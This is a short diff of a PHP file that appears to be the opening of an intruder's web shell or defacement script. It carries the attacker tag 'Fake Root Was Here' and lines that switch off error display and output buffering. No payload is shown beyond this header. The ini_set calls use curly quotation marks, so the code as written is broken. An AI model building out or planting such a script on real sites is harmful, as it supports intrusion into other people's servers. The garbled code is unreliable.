@@ -1,6 +1,3 @@
-<?php
-// ./Fake Root | email: fikriwalker4676.com //
-
 <?php /* ./Fake Root Was Here */ 
 @ini_set(‘output_buffering’,0); 
 @ini_set(‘display_errors’, 0);
